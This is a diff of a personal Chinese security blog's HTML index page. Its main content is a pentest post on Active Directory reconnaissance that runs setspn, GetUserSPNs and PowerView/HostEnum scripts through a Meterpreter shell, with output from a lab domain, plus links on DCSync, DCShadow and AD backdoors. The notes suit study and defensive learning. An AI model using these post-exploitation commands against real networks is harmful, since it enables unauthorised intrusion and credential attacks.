+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-17T12:47:58+08:00">
-                2019-07-17
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2019-07-17 12:47:58 / Geändert am: 12:58:59" itemprop="dateCreated datePublished" datetime="2019-07-17T12:47:58+08:00">2019-07-17</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a></span>
 
                 
                 
@@ -767,21 +1398,9 @@
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -789,72 +1408,85 @@
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <p>[TOC]</p>
+<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p><a href="https://www.anquanke.com/post/id/86634" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86634</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/8082623.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8082623.html</a></p>
+<p>SPN(Service Principal name)服务器主体名称。</p>
+<p>SPN 是服务在使用 Kerberos  身份验证的网络上的唯一标识符，它由服务类、主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如  NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN  将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。</p>
+<h4 id="SPN格式"><a href="#SPN格式" class="headerlink" title="SPN格式"></a>SPN格式</h4><p>SPN = serviceclass “/” hostname [“:”port][“/” servicename]</p>
+<p>serviceclass = mssql</p>
+<p>servicename =sql.bk.com</p>
+<p>其中：</p>
+<p>serviceclass:标识服务类的字符串，例如Web服务的www</p>
+<p>hostname:一个字符串，是系统的名称。这应该是全限定域名（FQDN）。</p>
+<p>port:一个数字，是该服务的端口号。</p>
+<p>servicename:一个字符串，它是服务的专有名称（DN），objectGuid，Internet主机名或全限定域名（FQDN）。</p>
+<p>注意: 服务类和主机是必需参数，但 端口和服务名是可选的，主机和端口之间的冒号只有当端口存在时才需要</p>
+<h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p><a href="https://pentestlab.blog/2018/06/04/spn-discovery/" target="_blank" rel="noopener">https://pentestlab.blog/2018/06/04/spn-discovery/</a></p>
+<p>在不进行网络端口扫描的情况下，通过ldap查询来发现服务。可以使用setspn命令来查询、删除、修改spn。</p>
+<p>使用如下命令列举处所有用户名和服务之间的关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T pentestlab -Q */*</span><br></pre></td></tr></table></figure>
+<p><a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx" target="_blank" rel="noopener">https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx</a></p>
+<p>获取与用户账户关联的spn记录的powershell脚本</p>
+<p><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
+<p>拿到meterpreter shell之后先load powershell，把powershell插件加载进来，然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_import /root/Desktop/kerberoast/GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/17/域内信息收集/QQ%E6%88%AA%E5%9B%BE20180611134624.png" alt=""></p>
+<p>导入一个本地的ps脚本。最好文件名不要带引号。</p>
+<hr>
+<p>另外一个工具套件</p>
+<p><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
+<p>导入时注意后缀名必须是ps1</p>
+<p>发现my sql server服务器名称和端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell_import /root/Desktop/PowerShell-AD-Recon/Discover-PSMSSQLServers.ps1</span><br><span class="line">powershell_execute Discover-PSMSSQLServers</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/17/域内信息收集/QQ截图20180611134835.png" alt=""></p>
+<p><img src="/2019/07/17/域内信息收集/QQ截图20180611134843.png" alt=""></p>
+<p>发现微软邮件服务器</p>
+<p><img src="/2019/07/17/域内信息收集/QQ截图20180611135715.png" alt=""></p>
+<p>其他内容</p>
+<p><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="noopener">https://pentestlab.blog/2018/05/28/situational-awareness/</a></p>
+<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p><a href="https://pentestlab.blog/2018/04/16/dcshadow/" target="_blank" rel="noopener">https://pentestlab.blog/2018/04/16/dcshadow/</a></p>
+<p><a href="https://www.dcshadow.com/" target="_blank" rel="noopener">https://www.dcshadow.com/</a></p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p><a href="http://www.freebuf.com/sectool/112594.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/112594.html</a></p>
+<h3 id="sidhistory后门，-AdminSDHolder后门，acl后门"><a href="#sidhistory后门，-AdminSDHolder后门，acl后门" class="headerlink" title="sidhistory后门， AdminSDHolder后门，acl后门"></a>sidhistory后门， AdminSDHolder后门，acl后门</h3><h3 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h3><h4 id="powerview"><a href="#powerview" class="headerlink" title="powerview"></a>powerview</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>导入脚本，并获取当前域名</p>
+<p><img src="/2019/07/17/域内信息收集/QQ截图20180611141641.png" alt=""></p>
+<p>枚举本地管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; powershell_execute Invoke-EnumerateLocalAdmin</span><br><span class="line">[+] Command execution completed:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/Administrator</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-500</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    : 2018/6/11 13:07:06</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/hl0rey</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-1000</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    : 2018/5/28 20:41:14</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/Enterprise Admins</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : True</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-519</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    :</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/Domain Admins</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : True</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-512</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    :</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/test1</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-1105</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    : 2018/6/10 21:37:51</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br><span class="line"></span><br><span class="line">ComputerName : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">AccountName  : hl0reytest.com/test2</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S-1-5-21-2225640037-3648700353-683585816-1106</span><br><span class="line">Description  :</span><br><span class="line">Disabled     :</span><br><span class="line">LastLogin    : 2018/6/10 21:53:01</span><br><span class="line">PwdLastSet   :</span><br><span class="line">PwdExpired   :</span><br><span class="line">UserFlags    :</span><br></pre></td></tr></table></figure>
+<p>获取域信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; powershell_execute Get-NetForest</span><br><span class="line">[+] Command execution completed:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RootDomainSid         : S-1-5-21-2225640037-3648700353-683585816</span><br><span class="line">Name                  : hl0reytest.com</span><br><span class="line">Sites                 : &#123;Default-First-Site-Name&#125;</span><br><span class="line">Domains               : &#123;hl0reytest.com&#125;</span><br><span class="line">GlobalCatalogs        : &#123;WIN-83JFM2NMS08.hl0reytest.com&#125;</span><br><span class="line">ApplicationPartitions : &#123;DC=DomainDnsZones,DC=hl0reytest,DC=com, DC=ForestDnsZones,DC=hl0reytest,DC=com&#125;</span><br><span class="line">ForestMode            : Windows2003Forest</span><br><span class="line">RootDomain            : hl0reytest.com</span><br><span class="line">Schema                : CN=Schema,CN=Configuration,DC=hl0reytest,DC=com</span><br><span class="line">SchemaRoleOwner       : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">NamingRoleOwner       : WIN-83JFM2NMS08.hl0reytest.com</span><br></pre></td></tr></table></figure>
+<p>查看当前有几个用户登陆到了本机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; powershell_shell</span><br><span class="line">PS &gt; Invoke-UserHunter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserDomain      : HL0REYTEST</span><br><span class="line">UserName        : Administrator</span><br><span class="line">ComputerName    : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">IPAddress       : 192.168.234.136</span><br><span class="line">SessionFrom     :</span><br><span class="line">SessionFromName :</span><br><span class="line">LocalAdmin      :</span><br><span class="line"></span><br><span class="line">UserDomain      : HL0REYTEST</span><br><span class="line">UserName        : Administrator</span><br><span class="line">ComputerName    : WIN-83JFM2NMS08.hl0reytest.com</span><br><span class="line">IPAddress       : 192.168.234.136</span><br><span class="line">SessionFrom     :</span><br><span class="line">SessionFromName :</span><br><span class="line">LocalAdmin      :</span><br></pre></td></tr></table></figure>
+<h4 id="HostRecon"><a href="#HostRecon" class="headerlink" title="HostRecon"></a>HostRecon</h4><p><a href="https://github.com/dafthack/HostRecon" target="_blank" rel="noopener">https://github.com/dafthack/HostRecon</a></p>
+<p>执行时间太长不合适。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; powershell_import /root/Desktop/HostRecon/HostRecon.ps1</span><br><span class="line">[+] File successfully imported. No result was returned.</span><br><span class="line">meterpreter &gt; powershell_execute Invoke-HostRecon</span><br><span class="line">[-] Error running command powershell_execute: Rex::TimeoutError Operation timed out.</span><br><span class="line">meterpreter &gt; powershell_execute Invoke-HostRecon</span><br><span class="line">[-] powershell_execute: Operation failed: 2148734468</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h4 id="HostEnum"><a href="#HostEnum" class="headerlink" title="HostEnum"></a>HostEnum</h4><p><a href="https://github.com/threatexpress/red-team-scripts" target="_blank" rel="noopener">https://github.com/threatexpress/red-team-scripts</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Invoke-HostEnum -Local -Domain</span><br><span class="line"></span><br><span class="line">Terminate channel 2? [y/N]  n</span><br><span class="line">[+] Invoke-HostEnum</span><br><span class="line">[+] STARTTIME:	20180611_063914</span><br><span class="line">[+] PID:	1612</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Host Summary</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOSTNAME             : WIN-83JFM2NMS08</span><br><span class="line">OS                   : Microsoft Windows Server 2008 R2 Datacenter  Service Pack 1</span><br><span class="line">ARCHITECTURE         : 64-bit</span><br><span class="line">DATE(UTC)            : 20180611063918</span><br><span class="line">DATE(LOCAL)          : 20180611143918+08</span><br><span class="line">INSTALLDATE          : 20180528101543.000000+480</span><br><span class="line">UPTIME               : 0 Days, 20 Hours, 57 Minutes, 46 Seconds</span><br><span class="line">IPADDRESSES          : fe80::e0d5:9b76:41e9:e2d6%11, 192.168.234.136</span><br><span class="line">DOMAIN               : hl0reytest.com</span><br><span class="line">USERNAME             : administrator</span><br><span class="line">LOGONSERVER          : \\WIN-83JFM2NMS08</span><br><span class="line">PSVERSION            : 2.0</span><br><span class="line">PSSCRIPTBLOCKLOGGING : Disabled</span><br><span class="line">PSTRANSCRIPTION      : Disabled</span><br><span class="line">PSTRANSCRIPTIONDIR   :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Installed Software:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DisplayName                                                    InstallDate DisplayVersion Publisher             Install</span><br><span class="line">                                                                                                                Locatio</span><br><span class="line">                                                                                                                n</span><br><span class="line">-----------                                                    ----------- -------------- ---------             -------</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 20180528    9.0.30729.6161 Microsoft Corporation</span><br><span class="line">Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 20180528    9.0.30729.6161 Microsoft Corporation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Installed Patches:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HotFixID Description InstalledBy              InstalledOn</span><br><span class="line">-------- ----------- -----------              -----------</span><br><span class="line">KB976902 Update      HL0REYTEST\Administrator 2010/11/21 0:00:00</span><br></pre></td></tr></table></figure>
+<h4 id="RemoteRecon"><a href="#RemoteRecon" class="headerlink" title="RemoteRecon"></a>RemoteRecon</h4><p><a href="https://github.com/xorrior/RemoteRecon" target="_blank" rel="noopener">https://github.com/xorrior/RemoteRecon</a></p>
 
-      
-        
-          
-          [TOC]
-SPNhttps://www.anquanke.com/post/id/86634
-https://www.cnblogs.com/backlion/p/8082623.html
-SPN(Service Principal name)服务器主体名称。
-SPN 是服务在使用 Kerbero
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/17/域内信息收集/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2019/07/17/备份恢复测试/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -866,53 +1498,38 @@ SPN 是服务在使用 Kerbero
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/17/备份恢复测试/" itemprop="url">备份恢复测试</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2019/07/17/备份恢复测试/" class="post-title-link" itemprop="url">备份恢复测试</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-17T11:42:56+08:00">
-                2019-07-17
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2019-07-17 11:42:56 / Geändert am: 11:45:21" itemprop="dateCreated datePublished" datetime="2019-07-17T11:42:56+08:00">2019-07-17</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/test/" itemprop="url" rel="index">
-                    <span itemprop="name">test</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/test/" itemprop="url" rel="index"><span itemprop="name">test</span></a></span>
 
                 
                 
@@ -921,21 +1538,9 @@ SPN 是服务在使用 Kerbero
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -943,68 +1548,30 @@ SPN 是服务在使用 Kerbero
     <div class="post-body" itemprop="articleBody">
 
       
-      
-
-      
-        
-          
-          发布成功
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/17/备份恢复测试/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          <h1 id="发布成功"><a href="#发布成功" class="headerlink" title="发布成功"></a>发布成功</h1>
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/04/01/debian解决终端编码报错/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1016,53 +1583,38 @@ SPN 是服务在使用 Kerbero
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/01/debian解决终端编码报错/" itemprop="url">debian解决终端编码报错</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2018/04/01/debian解决终端编码报错/" class="post-title-link" itemprop="url">debian解决终端编码报错</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-01T16:28:48+08:00">
-                2018-04-01
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2018-04-01 16:28:48 / Geändert am: 16:34:49" itemprop="dateCreated datePublished" datetime="2018-04-01T16:28:48+08:00">2018-04-01</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/linux/" itemprop="url" rel="index">
-                    <span itemprop="name">linux</span>
-                  </a>
-                </span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a></span>
 
                 
                 
@@ -1071,21 +1623,9 @@ SPN 是服务在使用 Kerbero
           
 
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
 
         </div>
       </header>
-    
 
     
     
@@ -1093,70 +1633,32 @@ SPN 是服务在使用 Kerbero
     <div class="post-body" itemprop="articleBody">
 
       
-      
+          <h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>当在linux终端中运行程序，并且程序使用unicode字符集的时，如果爆出ascii无法解码某字符的错误，那么就很有可能是linux机器的语言环境配置问题。</p>
+<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>直接执行<br>dpkg-reconfigure locales<br>进入语言配置界面重新配置即可。</p>
 
-      
-        
-          
-          问题描述当在linux终端中运行程序，并且程序使用unicode字符集的时，如果爆出ascii无法解码某字符的错误，那么就很有可能是linux机器的语言环境配置问题。
-问题解决直接执行dpkg-reconfigure locales进入语言配置界面重新配置即可。
-
-          
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/04/01/debian解决终端编码报错/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
         
       
     </div>
-    
-    
-    
-    <div>
-      
-    </div>
-    
 
     
-
     
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
   </div>
   
   
   
   </article>
 
-
     
-      
-
-  
-
+        <article itemscope itemtype="http://schema.org/Article">
   
   
   
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
+  <div class="post-block home">
     <link itemprop="mainEntityOfPage" href="http://hl0rey.github.io/2018/02/25/代码审计之文件上传/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1168,53 +1670,46 @@ SPN 是服务在使用 Kerbero
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="hl0rey's blog">
     </span>
-
-    
       <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/25/代码审计之文件上传/" itemprop="url">代码审计之文件上传</a></h1>
-        
+        <h1 class="post-title" itemprop="name headline">
+            
+            <a href="/2018/02/25/代码审计之文件上传/" class="post-title-link" itemprop="url">代码审计之文件上传</a>
+          
+        </h1>
 
         <div class="post-meta">
-          <span class="post-time">
-            
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
               
-                <span class="post-meta-item-text">发表于</span>
+                
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-25T21:21:02+08:00">
-                2018-02-25
-              </time>
-            
 
-            
-
-            
-          </span>
-
+              <time title="Erstellt: 2018-02-25 21:21:02" itemprop="dateCreated datePublished" datetime="2018-02-25T21:21:02+08:00">2018-02-25</time>
+            </span>
           
-            <span class="post-category" >
             
-              <span class="post-meta-divider">|</span>
+
             
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2018-02-26 18:13:50" itemprop="dateModified" datetime="2018-02-26T18:13:50+08:00">2018-02-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
+              <span class="post-meta-item-text">in</span>
               
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/code/" itemprop="url" rel="index">
-                    <span itemprop="name">code</span>
-                  </a>
-                </span>
